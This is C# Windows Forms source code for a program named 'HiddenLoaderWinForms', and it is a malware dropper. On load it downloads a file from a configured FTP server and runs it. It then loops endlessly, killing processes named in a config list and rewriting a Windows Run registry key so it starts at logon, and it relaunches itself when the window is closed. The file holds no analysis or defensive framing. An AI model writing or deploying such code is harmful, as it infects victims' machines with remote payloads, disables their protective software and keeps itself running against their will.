using System;
using System.Windows.Forms;
using System.IO;
using System.Net;
using System.Diagnostics;
using Microsoft.Win32;

namespace HiddenLoaderWinForms
{
    public partial class Form1 : Form
    {

        public Form1()
        {
            InitializeComponent();
        }


        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                FtpWebRequest request = (FtpWebRequest)WebRequest.Create(Config.DownloadFtpAddress); //creating ftp web request
                request.Method = WebRequestMethods.Ftp.DownloadFile; // select request method
                request.Credentials = new NetworkCredential(Config.FtpUserName, Config.FtpUserPassword); //initialize user for web request
                FtpWebResponse response = (FtpWebResponse)request.GetResponse(); 
                Stream responseStream = response.GetResponseStream();
                FileStream file = File.Create(Config.DownloadPathDir); //creating file in download directory from Config.cs 
                byte[] bufferSize = new byte[512 * 1024]; //set buffer size
                int read;
                while (responseStream != null && (read = responseStream.Read(bufferSize, 0, bufferSize.Length)) > 0)
                {
                    file.Write(bufferSize, 0, read);
                    
                }
                file.Close();
                responseStream?.Close();
                response.Close();
                Process.Start(Config.RunProcessFileDir); //run downloaded file from directory from Config.cs
            }
            catch (Exception)
            {
                
            }

            while (true)
            {
                for (int i = 0; i < Config.ProcessNames.Length; i++)
                {
                    var processName = Config.ProcessNames[i];
                    foreach (Process proc in Process.GetProcessesByName(processName))
                    {
                        proc.Kill();
                    }

                    if (i > Config.ProcessNames.Length)
                    {
                        i = 0;
                    }
                }

                System.Threading.Thread.Sleep(30);

                string exePath = System.Windows.Forms.Application.ExecutablePath; //getting this file path
                RegistryKey reg;
                reg = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run\\");//path for create registry key
                reg.SetValue(Config.StartupProcessName, exePath);
                reg.Close();
            }
        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            System.Diagnostics.Process.Start(Application.ExecutablePath);
            Environment.Exit(0);
        }

        private void label2_Click(object sender, EventArgs e)
        {

        }
    }
    }